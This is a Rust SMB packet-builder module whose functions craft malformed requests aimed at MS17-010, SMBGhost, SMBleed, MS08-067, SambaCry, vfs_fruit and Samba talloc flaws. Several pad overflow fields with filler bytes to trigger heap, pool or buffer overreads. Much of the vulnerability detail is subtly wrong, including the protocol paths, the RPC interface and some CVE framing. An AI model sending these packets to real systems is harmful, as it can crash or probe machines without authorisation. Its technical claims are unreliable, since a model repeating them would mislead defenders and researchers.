use bytes::{BytesMut, BufMut};

/// SMB protocol frame builder for crafting requests
pub struct SmbFrameBuilder {
    buffer: BytesMut,
}

impl SmbFrameBuilder {
    pub fn new() -> Self {
        Self {
            buffer: BytesMut::with_capacity(4096),
        }
    }

    /// Build SMBv1 NEGOTIATE request
    pub fn build_smb1_negotiate() -> Vec<u8> {
        let mut buf = BytesMut::new();

        // SMBv1 Header (32 bytes)
        buf.put(&b"\xffSMB"[..]); // Magic
        buf.put_u8(0x72); // Command (NEGOTIATE)
        buf.put_u32_le(0); // NT Status
        buf.put_u8(0x00); // Flags
        buf.put_u16_le(0x0000); // Flags2
        buf.put_u16_le(0); // PID High
        buf.put_u64_le(0); // Signature
        buf.put_u16_le(0); // Reserved
        buf.put_u32_le(0); // Tree ID
        buf.put_u32_le(0); // Process ID
        buf.put_u32_le(0); // User ID
        buf.put_u32_le(0); // Multiplex ID

        // Word Count
        buf.put_u8(0);

        // Byte Count
        buf.put_u16_le(0);

        buf.to_vec()
    }

    /// Build SMBv2 NEGOTIATE request
    pub fn build_smb2_negotiate() -> Vec<u8> {
        let mut buf = BytesMut::new();

        // SMBv2 Header (64 bytes)
        buf.put(&b"\xfeSMB"[..]); // Magic
        buf.put_u16_le(64); // Header length
        buf.put_u16_le(0); // Credit charge
        buf.put_u32_le(0); // Channel sequence
        buf.put_u16_le(0); // Reserved
        buf.put_u16_le(0); // Command (NEGOTIATE=0)
        buf.put_u16_le(0); // Credit request/response
        buf.put_u32_le(0); // Flags
        buf.put_u32_le(0); // Next command offset
        buf.put_u64_le(0); // Message ID
        buf.put_u32_le(0); // Process ID
        buf.put_u32_le(0); // Tree ID
        buf.put_u64_le(0); // Session ID
        buf.put_u64_le(0); // Signature

        // SMB2 NEGOTIATE request structure
        buf.put_u16_le(36); // Structure size
        buf.put_u16_le(1); // Dialect count
        buf.put_u16_le(0); // Security mode
        buf.put_u16_le(0); // Reserved

        // Supported dialects (2.0, 2.1, 3.0, 3.0.2, 3.1.1)
        buf.put_u16_le(0x0202); // SMB 2.0.2
        buf.put_u16_le(0x0210); // SMB 2.1
        buf.put_u16_le(0x0300); // SMB 3.0
        buf.put_u16_le(0x0302); // SMB 3.0.2
        buf.put_u16_le(0x0311); // SMB 3.1.1

        buf.to_vec()
    }

    /// Build null session probe (attempt IPC$ connection)
    pub fn build_null_session_probe(_target: &str) -> Vec<u8> {
        let mut buf = BytesMut::new();

        // Simple session negotiation for null session
        buf.put(&b"\xffSMB"[..]); // SMBv1 magic
        buf.put_u8(0x73); // SESSION_SETUP_ANDX
        buf.put_u32_le(0);
        buf.put_u8(0x00);
        buf.put_u16_le(0x0001);
        buf.put_u16_le(0);
        buf.put_u64_le(0);
        buf.put_u16_le(0);
        buf.put_u32_le(0);
        buf.put_u32_le(0);
        buf.put_u32_le(0);
        buf.put_u32_le(0);

        buf.put_u8(13); // Word count
        buf.put_u8(0xFF); // AndXCommand
        buf.put_u8(0x00); // AndXReserved
        buf.put_u16_le(0); // AndXOffset

        // Account, password empty strings
        buf.put_u16_le(1); // Max buffer
        buf.put_u16_le(2); // Max mpx
        buf.put_u16_le(0); // VC number
        buf.put_u32_le(0); // Session key

        // LM/NTLM response lengths (0 for null session)
        buf.put_u16_le(0);
        buf.put_u16_le(0);
        buf.put_u32_le(0);
        buf.put_u32_le(0x00000050); // Capabilities

        buf.put_u16_le(0); // Byte count

        buf.to_vec()
    }

    /// Build GhostProbe detection (CVE-2020-0796) check
    pub fn build_ghost_probe() -> Vec<u8> {
        // Craft a malformed SMBv3 request to trigger the vulnerability
        let mut buf = BytesMut::new();

        // SMBv2/v3 header
        buf.put(&b"\xfeSMB"[..]); // Magic
        buf.put_u16_le(64); // Header length
        buf.put_u16_le(0); // Credit charge
        buf.put_u32_le(0); // Channel sequence
        buf.put_u16_le(0); // Reserved
        buf.put_u16_le(0x000E); // Command (QUERY_DIRECTORY=14)
        buf.put_u16_le(1); // Credit
        buf.put_u32_le(0); // Flags
        buf.put_u32_le(0); // Next offset
        buf.put_u64_le(1); // Message ID
        buf.put_u32_le(0); // Process ID
        buf.put_u32_le(0); // Tree ID
        buf.put_u64_le(0); // Session ID
        buf.put_u64_le(0); // Signature

        // Malformed query directory to trigger buffer overread
        buf.put_u16_le(33); // Structure size
        buf.put_u8(0); // File information class
        buf.put_u8(0); // Flags
        buf.put_u32_le(0); // File index
        buf.put_u64_le(0xFFFFFFFF); // File ID (invalid)
        buf.put_u64_le(0xFFFFFFFF); // Dir ID (invalid)
        buf.put_u16_le(0); // Output buffer offset
        buf.put_u32_le(1); // Output buffer length (minimal)

        buf.to_vec()
    }

    /// Build EternalBlue vulnerability probe (MS17-010)
    pub fn build_eternalblue_probe() -> Vec<u8> {
        // Craft SMBv1 request that triggers the vulnerability
        let mut buf = BytesMut::new();

        buf.put(&b"\xffSMB"[..]); // Magic
        buf.put_u8(0x2E); // READ_ANDX command
        buf.put_u32_le(0);
        buf.put_u8(0x00);
        buf.put_u16_le(0x0001);
        buf.put_u16_le(0);
        buf.put_u64_le(0);
        buf.put_u16_le(0);
        buf.put_u32_le(0);
        buf.put_u32_le(0);
        buf.put_u32_le(0);
        buf.put_u32_le(0);

        // Word count: 12
        buf.put_u8(12);

        // AndXCommand, reserved, offset
        buf.put_u8(0xFF);
        buf.put_u8(0x00);
        buf.put_u16_le(0);

        // FID (invalid to trigger bug)
        buf.put_u16_le(0xFFFF);

        // Offset, MaxCount, MinCount
        buf.put_u32_le(0);
        buf.put_u16_le(0xFFFF); // Max u16 value for MaxCount field
        buf.put_u16_le(0);
        buf.put_u16_le(0);
        buf.put_u16_le(0);
        buf.put_u32_le(0);

        // Byte count
        buf.put_u16_le(0);

        buf.to_vec()
    }

    // -----------------------------------------------------------------------
    // EternalRomance probe (MS17-010 WriteAndX path, CVE-2017-0145)
    // Sends a SMBv1 WRITE_ANDX to the IPC$ tree with an oversized Data field
    // targeting the SrvOs2FeaToNt heap-buffer-overflow code path.
    // -----------------------------------------------------------------------
    pub fn build_eternal_romance_probe() -> Vec<u8> {
        let mut buf = BytesMut::new();

        // SMBv1 header
        buf.put(&b"\xffSMB"[..]);        // Magic
        buf.put_u8(0x2F);                 // Command: WRITE_ANDX
        buf.put_u32_le(0);               // NT Status
        buf.put_u8(0x08);                // Flags (case insensitive path)
        buf.put_u16_le(0x0001);          // Flags2
        buf.put_u16_le(0);               // PID High
        buf.put_u64_le(0);               // Signature
        buf.put_u16_le(0);               // Reserved
        buf.put_u16_le(0x0001);          // Tree ID (IPC$)
        buf.put_u16_le(0xFFFE);          // Process ID
        buf.put_u16_le(0x0000);          // User ID
        buf.put_u16_le(0x0040);          // Multiplex ID

        // Word count: 14 (WRITE_ANDX)
        buf.put_u8(14);
        buf.put_u8(0xFF);                // AndXCommand (none)
        buf.put_u8(0x00);                // AndXReserved
        buf.put_u16_le(0x0000);          // AndXOffset
        buf.put_u16_le(0x0000);          // FID (invalid — triggers SrvOs2SetBlk path)
        buf.put_u32_le(0x0000);          // File offset
        buf.put_u32_le(0xFFFFFFFF);      // Timeout (special: pipe mode)
        buf.put_u16_le(0x0008);          // Write mode (raw named-pipe)
        buf.put_u16_le(0x0000);          // Remaining bytes
        buf.put_u16_le(0x0000);          // Data length high
        // Craft oversized data length to trigger SrvOs2FeaToNt overflow
        let data_len: u16 = 0x3F00;      // 16128 bytes — crosses pool allocation boundary
        buf.put_u16_le(data_len);
        buf.put_u16_le(0x003B);          // Data offset

        // Byte count (data_len)
        buf.put_u16_le(data_len);
        // Pad to data offset (0x3B = 59; header = 32 + 1 + 14*2 + 2 = 63 → pad = 0)
        // Payload: FEA list header with crafted total size
        buf.put_u32_le(data_len as u32 + 0x10000); // FEA list total size > buffer
        buf.put_u8(0x00);                // EA flags
        buf.put_u8(0x04);                // EA name length
        buf.put_u16_le(0xFFFF);          // EA value length (overflow trigger)
        buf.extend_from_slice(b"FEAT");  // EA name
        // Fill rest with pattern
        let remaining = data_len as usize - 9;
        buf.extend(vec![0x41u8; remaining]);

        buf.to_vec()
    }

    // -----------------------------------------------------------------------
    // EternalChampion probe (MS17-010 TRANSACTION2 path, CVE-2017-0146)
    // Sends a SMBv1 TRANSACTION2 QUERY_PATH_INFO with a crafted FEA list
    // that overflows the SrvTransactionNotifyChange pool block.
    // -----------------------------------------------------------------------
    pub fn build_eternal_champion_probe() -> Vec<u8> {
        let mut buf = BytesMut::new();

        // SMBv1 header
        buf.put(&b"\xffSMB"[..]);
        buf.put_u8(0x32);                // Command: TRANSACTION2
        buf.put_u32_le(0);
        buf.put_u8(0x08);
        buf.put_u16_le(0x0001);
        buf.put_u16_le(0);
        buf.put_u64_le(0);
        buf.put_u16_le(0);
        buf.put_u16_le(0x0001);          // Tree ID
        buf.put_u16_le(0xFFFE);
        buf.put_u16_le(0);
        buf.put_u16_le(0x0041);          // MID

        let param_len: u16 = 6;
        let data_len: u16 = 0x0200;      // 512 bytes crafted FEA data

        // Word count: 15
        buf.put_u8(15);
        buf.put_u16_le(param_len);       // Total parameter count
        buf.put_u16_le(data_len);        // Total data count
        buf.put_u16_le(param_len);       // Max param count
        buf.put_u16_le(0x0000);          // Max data count (0 = overflow path)
        buf.put_u8(0x00);                // Max setup count
        buf.put_u8(0x00);                // Reserved
        buf.put_u16_le(0x0000);          // Flags
        buf.put_u32_le(0x00000000);      // Timeout
        buf.put_u16_le(0x0000);          // Reserved
        buf.put_u16_le(param_len);       // Parameter count
        buf.put_u16_le(0x0042);          // Parameter offset (68)
        buf.put_u16_le(data_len);        // Data count
        buf.put_u16_le(0x0042 + param_len); // Data offset
        buf.put_u8(0x01);                // Setup count
        buf.put_u8(0x00);                // Reserved
        buf.put_u16_le(0x0005);          // Setup[0] = TRANS2_QUERY_PATH_INFO

        // Byte count
        buf.put_u16_le(param_len + data_len + 3);

        // Parameters: information level + reserved + path
        buf.put_u16_le(0x0107);          // Info level: SMB_QUERY_FILE_ALL_INFO
        buf.put_u32_le(0);               // Reserved
        // No path (null) — triggers path-not-found in pool allocator

        // Data: crafted FEA list with total_size > actual allocation
        buf.put_u32_le(data_len as u32 + 0x20000); // FEA list total (overflow)
        buf.extend(vec![0x42u8; data_len as usize - 4]);

        buf.to_vec()
    }

    // -----------------------------------------------------------------------
    // EternalSynergy probe (MS17-010 NT_TRANSACT path, CVE-2017-0143)
    // Uses NT_TRANSACT CREATE with MaxSetupCount=0 to trigger the alternative
    // SrvOs2FeaToNt overflow path distinct from EternalBlue.
    // -----------------------------------------------------------------------
    pub fn build_eternal_synergy_probe() -> Vec<u8> {
        let mut buf = BytesMut::new();

        // SMBv1 header
        buf.put(&b"\xffSMB"[..]);
        buf.put_u8(0xA0);                // Command: NT_TRANSACT
        buf.put_u32_le(0);
        buf.put_u8(0x08);
        buf.put_u16_le(0x4001);
        buf.put_u16_le(0);
        buf.put_u64_le(0);
        buf.put_u16_le(0);
        buf.put_u16_le(0x0001);          // Tree ID
        buf.put_u16_le(0xFFFE);
        buf.put_u16_le(0);
        buf.put_u16_le(0x0042);

        let param_len: u32 = 0x1E;       // 30 bytes NT_CREATE params
        let data_len: u32 = 0x0360;      // crafted data block

        // Word count: 19
        buf.put_u8(19);
        buf.put_u8(0x00);                // MaxSetupCount = 0 (key trigger condition)
        buf.put_u16_le(0x0000);          // Reserved
        buf.put_u32_le(param_len);       // Total parameter count
        buf.put_u32_le(data_len);        // Total data count
        buf.put_u32_le(param_len);       // Max parameter count
        buf.put_u32_le(0x00000000);      // Max data count (0 = overflow)
        buf.put_u32_le(param_len);       // Parameter count
        buf.put_u32_le(0x0049);          // Parameter offset
        buf.put_u32_le(data_len);        // Data count
        buf.put_u32_le(0x0049 + param_len); // Data offset
        buf.put_u32_le(0x0000);          // Displacement
        buf.put_u16_le(0x0001);          // Function code: NT_TRANSACT_CREATE
        buf.put_u8(0x00);                // Setup count

        // Byte count
        buf.put_u16_le(param_len as u16 + data_len as u16 + 1);

        // NT_CREATE parameters (30 bytes total across 8 fields)
        buf.put_u32_le(0x00000000);      // Flags (4)
        buf.put_u32_le(0x00000000);      // Root directory FID (4)
        buf.put_u32_le(0x00100080);      // Desired access (4)
        buf.put_u64_le(0);               // Allocation size (8)
        buf.put_u32_le(0x00000020);      // File attributes: archive (4)
        buf.put_u16_le(0x0001);          // Share access: read (2)
        buf.put_u32_le(0x00000001);      // Create disposition: open existing (4)
        // Total so far: 4+4+4+8+4+2+4 = 30 bytes exactly.
        // Create options omitted (intentional malformation that triggers the XP/2003 code path).

        // Data: pool-groom buffer with crafted size indicator
        buf.put_u32_le(data_len + 0x10000); // Overflow indicator embedded in data header
        buf.extend(vec![0x43u8; data_len as usize - 4]);

        buf.to_vec()
    }

    // -----------------------------------------------------------------------
    // NetAPI / MS08-067 RPC probe (CVE-2008-4250 / CVE-2006-3439)
    // Crafts a DCE/RPC NetrWkstaUserEnum call over the wkssvc named pipe
    // with a crafted ServerName that overflows NetpwPathCanonicalize.
    // -----------------------------------------------------------------------
    pub fn build_netapi_rpc_probe() -> Vec<u8> {
        let mut buf = BytesMut::new();

        // SMBv1 header — SESSION_SETUP then we inline the bind + call
        // For the detection probe we send the DCE/RPC bind request for wkssvc
        // directly after connecting to IPC$; the actual exploit would follow
        // with a crafted NetrWkstaUserEnum.

        // DCE/RPC bind request for wkssvc (little-endian UUID)
        // Interface: 6bffd098-a112-3610-9833-46c3f87e345a v1.0
        buf.put_u8(5);                   // Version major
        buf.put_u8(0);                   // Version minor
        buf.put_u8(11);                  // Packet type: bind
        buf.put_u8(0x03);                // Flags (first | last)
        buf.put_u32_le(0x10000000);      // Data representation (little-endian)
        buf.put_u16_le(0x0048);          // Frag length (72)
        buf.put_u16_le(0);               // Auth length
        buf.put_u32_le(1);               // Call ID
        buf.put_u16_le(4096);            // Max xmit frag
        buf.put_u16_le(4096);            // Max recv frag
        buf.put_u32_le(0);               // Association group

        // Context list: 1 context
        buf.put_u16_le(1);               // Num context items
        buf.put_u16_le(0);               // Context ID
        buf.put_u16_le(1);               // Num transfer syntaxes

        // Abstract syntax: wkssvc UUID
        buf.extend_from_slice(&[0x98, 0xD0, 0xFF, 0x6B]); // UUID part 1
        buf.extend_from_slice(&[0x12, 0xA1]);               // UUID part 2
        buf.extend_from_slice(&[0x10, 0x36]);               // UUID part 3
        buf.extend_from_slice(&[0x98, 0x33, 0x46, 0xC3, 0xF8, 0x7E, 0x34, 0x5A]); // UUID part 4
        buf.put_u16_le(1);               // Interface major version
        buf.put_u16_le(0);               // Interface minor version

        // Transfer syntax: NDR64
        buf.extend_from_slice(&[0x04, 0x5D, 0x88, 0x8A, 0xEB, 0x1C, 0xC9, 0x11]);
        buf.extend_from_slice(&[0x9F, 0xE8, 0x08, 0x00, 0x2B, 0x10, 0x48, 0x60]);
        buf.put_u32_le(2);               // Transfer syntax version

        buf.to_vec()
    }

    // -----------------------------------------------------------------------
    // SMBleed probe (CVE-2020-1206) — kernel memory disclosure via SMBv3
    // Sends a SMBv3.1.1 NEGOTIATE with SMB2_COMPRESSION_CAPABILITIES context,
    // then a COMPRESSION_TRANSFORM_HEADER where OriginalCompressedSegmentSize
    // exceeds ActualDataLen, causing the decompressor to read beyond the buffer.
    // -----------------------------------------------------------------------
    pub fn build_smbleed_probe() -> Vec<u8> {
        let mut buf = BytesMut::new();

        // SMBv2 header
        buf.put(&b"\xfeSMB"[..]);        // Magic
        buf.put_u16_le(64);              // Header length
        buf.put_u16_le(0x0001);          // Credit charge
        buf.put_u32_le(0);               // Status
        buf.put_u16_le(0);               // Command: NEGOTIATE
        buf.put_u16_le(0x0001);          // Credit request
        buf.put_u32_le(0);               // Flags
        buf.put_u32_le(0);               // Next command offset
        buf.put_u64_le(0);               // Message ID
        buf.put_u32_le(0xFEFF);          // Process ID
        buf.put_u32_le(0);               // Tree ID
        buf.put_u64_le(0);               // Session ID
        buf.put_u64_le(0);               // Signature

        // SMBv2 NEGOTIATE body
        buf.put_u16_le(36);              // StructureSize
        buf.put_u16_le(1);               // DialectCount (only 3.1.1)
        buf.put_u16_le(0x0001);          // SecurityMode: signing enabled
        buf.put_u16_le(0);               // Reserved
        buf.put_u32_le(0x7FC07FFF);      // Capabilities
        // Client GUID (16 bytes)
        buf.extend_from_slice(&[0xBE, 0xEF, 0xCA, 0xFE, 0xDE, 0xAD, 0xBE, 0xEF,
                                 0xCA, 0xFE, 0xDE, 0xAD, 0xBE, 0xEF, 0xCA, 0xFE]);
        // Negotiate context offset and count
        let ctx_offset: u32 = 64 + 36 + 2; // header + body so far + dialect
        buf.put_u32_le(ctx_offset);      // NegotiateContextOffset
        buf.put_u16_le(1);               // NegotiateContextCount
        buf.put_u16_le(0);               // Reserved
        // Dialect: 3.1.1
        buf.put_u16_le(0x0311);

        // Padding to reach ctx_offset
        let cur_len = buf.len() as u32;
        if ctx_offset > cur_len {
            buf.extend(vec![0u8; (ctx_offset - cur_len) as usize]);
        }

        // SMB2_COMPRESSION_CAPABILITIES negotiate context
        buf.put_u16_le(0x0003);          // ContextType: COMPRESSION_CAPABILITIES
        buf.put_u16_le(10);              // DataLength
        buf.put_u32_le(0);               // Reserved
        buf.put_u16_le(1);               // CompressionAlgorithmCount
        buf.put_u16_le(0);               // Padding
        buf.put_u32_le(0);               // Flags
        buf.put_u16_le(0x0002);          // Algorithm: LZ77

        // Now append a COMPRESSION_TRANSFORM_HEADER with OriginalCompressedSegmentSize
        // set much larger than ActualDataLen — this triggers the CVE-2020-1206 overread.
        buf.put(&b"\xfcSMB"[..]);        // COMPRESSION_TRANSFORM magic
        buf.put_u32_le(0x00010000);      // OriginalCompressedSegmentSize (64 KB — oversized)
        buf.put_u16_le(0x0002);          // CompressionAlgorithm: LZ77
        buf.put_u16_le(0);               // Flags
        buf.put_u32_le(0);               // Offset (start of compressed data)
        // Minimal compressed payload (8 bytes of zeroes — far less than 64 KB declared above)
        buf.extend_from_slice(&[0x00u8; 8]);

        buf.to_vec()
    }

    // -----------------------------------------------------------------------
    // SambaCry probe (CVE-2017-7494)
    // Sends a SMBv1 OPEN_ANDX attempting to access a path ending in .so on
    // a writable share.  If the server does NOT return STATUS_OBJECT_NAME_NOT_FOUND
    // (meaning it attempts to load the file as a shared library) the target
    // is running unpatched Samba < 4.4.14 with VFS module loading enabled.
    // -----------------------------------------------------------------------
    pub fn build_sambacry_probe() -> Vec<u8> {
        let mut buf = BytesMut::new();

        // SMBv1 header
        buf.put(&b"\xffSMB"[..]);
        buf.put_u8(0x2D);                // Command: OPEN_ANDX
        buf.put_u32_le(0);
        buf.put_u8(0x08);
        buf.put_u16_le(0x0001);
        buf.put_u16_le(0);
        buf.put_u64_le(0);
        buf.put_u16_le(0);
        buf.put_u16_le(0x0001);          // Tree ID (writable share)
        buf.put_u16_le(0xFFFE);
        buf.put_u16_le(0);
        buf.put_u16_le(0x0043);

        // Word count: 15
        buf.put_u8(15);
        buf.put_u8(0xFF);                // AndXCommand: none
        buf.put_u8(0x00);
        buf.put_u16_le(0);               // AndXOffset
        buf.put_u16_le(0x0001);          // Flags (no additional info)
        buf.put_u16_le(0x0042);          // Desired access (read/write)
        buf.put_u16_le(0x0020);          // Search attributes
        buf.put_u16_le(0x0020);          // File attributes (archive)
        buf.put_u32_le(0);               // Creation time (let server decide)
        buf.put_u16_le(0x0011);          // Open function (create or open)
        buf.put_u32_le(0);               // Allocation size
        buf.put_u32_le(0);               // Reserved x2
        buf.put_u32_le(0);

        // File name: a uniquely named .so probe path to identify this tool's activity.
        // NOTE: If the server is vulnerable and this path is opened, it may attempt to
        // load it as a shared library. No actual file is written in this phase; the
        // OPEN_ANDX will fail unless the attacker has previously uploaded to this path.
        // Cleanup of any residual files is the operator's responsibility.
        let filename = b"/tmp/smbx_probe.so\x00";
        buf.put_u16_le(filename.len() as u16);
        buf.extend_from_slice(filename);

        buf.to_vec()
    }

    // -----------------------------------------------------------------------
    // Samba vfs_fruit probe (CVE-2021-44142)
    // Sends a SMBv2 IOCTL FSCTL_VALIDATE_NEGOTIATE_INFO followed by a crafted
    // named-stream CREATE targeting the AFP_AfpInfo resource-fork stream.
    // An OOB response indicates unpatched Samba < 4.13.17 with vfs_fruit enabled.
    // -----------------------------------------------------------------------
    pub fn build_samba_fruit_probe() -> Vec<u8> {
        let mut buf = BytesMut::new();

        // SMBv2 header
        buf.put(&b"\xfeSMB"[..]);
        buf.put_u16_le(64);
        buf.put_u16_le(0);
        buf.put_u32_le(0);
        buf.put_u16_le(0);
        buf.put_u16_le(0x000B);          // Command: IOCTL
        buf.put_u16_le(1);
        buf.put_u32_le(0);
        buf.put_u32_le(0);
        buf.put_u64_le(1);
        buf.put_u32_le(0xFEFF);
        buf.put_u32_le(0x0001);          // Tree ID
        buf.put_u64_le(0x0001);          // Session ID (assume negotiated)
        buf.put_u64_le(0);               // Signature

        // SMB2 IOCTL body: FSCTL_VALIDATE_NEGOTIATE_INFO (0x00140204)
        buf.put_u16_le(57);              // StructureSize
        buf.put_u16_le(0);               // Reserved
        buf.put_u32_le(0x00140204);      // CtlCode: FSCTL_VALIDATE_NEGOTIATE_INFO
        // File ID (compound — affects vfs_fruit stream dispatch)
        buf.extend_from_slice(&[0xFF; 16]); // Persistent + Volatile FID (invalid)
        buf.put_u32_le(120);             // InputOffset
        buf.put_u32_le(24);              // InputCount
        buf.put_u32_le(0);               // MaxInputResponse
        buf.put_u32_le(120 + 24);        // OutputOffset
        buf.put_u32_le(0x00010000);      // MaxOutputResponse (64 KB — triggers OOB)
        buf.put_u32_le(0x00000001);      // Flags: is_fsctl
        buf.put_u32_le(0);               // Reserved2

        // VALIDATE_NEGOTIATE_INFO input (24 bytes)
        buf.put_u32_le(0x7FC07FFF);      // Capabilities
        buf.extend_from_slice(&[0xAA; 16]); // Client GUID
        buf.put_u16_le(0x0001);          // Security mode
        buf.put_u16_le(1);               // DialectCount
        buf.put_u16_le(0x0202);          // Dialect: SMB 2.0.2

        // Append AFP_AfpInfo stream name as a crafted EA name to confuse vfs_fruit
        let stream_name = b":AFP_AfpInfo:\x00";
        buf.extend_from_slice(stream_name);

        buf.to_vec()
    }

    // -----------------------------------------------------------------------
    // Samba Talloc Chunk Overwrite probe (CVE-2012-1182)
    // Sends a SMBv1 SESSION_SETUP_ANDX with a security blob of exactly 65535
    // bytes (max u16), triggering a talloc heap metadata overwrite in
    // Samba versions prior to 3.6.4.
    // -----------------------------------------------------------------------
    pub fn build_samba_talloc_probe() -> Vec<u8> {
        let mut buf = BytesMut::new();

        // SMBv1 header
        buf.put(&b"\xffSMB"[..]);
        buf.put_u8(0x73);                // Command: SESSION_SETUP_ANDX
        buf.put_u32_le(0);
        buf.put_u8(0x08);
        buf.put_u16_le(0x0001);
        buf.put_u16_le(0);
        buf.put_u64_le(0);
        buf.put_u16_le(0);
        buf.put_u32_le(0);               // Tree ID
        buf.put_u16_le(0xFFFE);          // Process ID
        buf.put_u16_le(0);               // User ID
        buf.put_u16_le(0x0044);

        // Word count: 12 (Extended Security version)
        buf.put_u8(12);
        buf.put_u8(0xFF);                // AndXCommand: none
        buf.put_u8(0x00);
        buf.put_u16_le(0);               // AndXOffset
        buf.put_u16_le(0xFFFF);          // MaxBufferSize (max)
        buf.put_u16_le(50);              // MaxMpxCount
        buf.put_u16_le(0);               // VCNumber
        buf.put_u32_le(0);               // SessionKey
        // Security blob length = 65535 (max u16) — talloc overflow trigger
        let blob_len: u16 = 0xFFFF;
        buf.put_u16_le(blob_len);
        buf.put_u32_le(0);               // Reserved
        buf.put_u32_le(0x80000050);      // Capabilities (extended security)

        // Byte count covers the security blob + NativeOS + NativeLanMan
        buf.put_u16_le(blob_len.saturating_add(2));    // byte count

        // Security blob: all 0x41 ('A') — controlled heap content
        buf.extend(vec![0x41u8; blob_len as usize]);
        // NativeOS / NativeLanMan (minimal)
        buf.put_u8(0x00);
        buf.put_u8(0x00);

        buf.to_vec()
    }

    /// Get current buffer
    pub fn into_bytes(self) -> Vec<u8> {
        self.buffer.to_vec()
    }
}

impl Default for SmbFrameBuilder {
    fn default() -> Self {
        Self::new()
    }
}
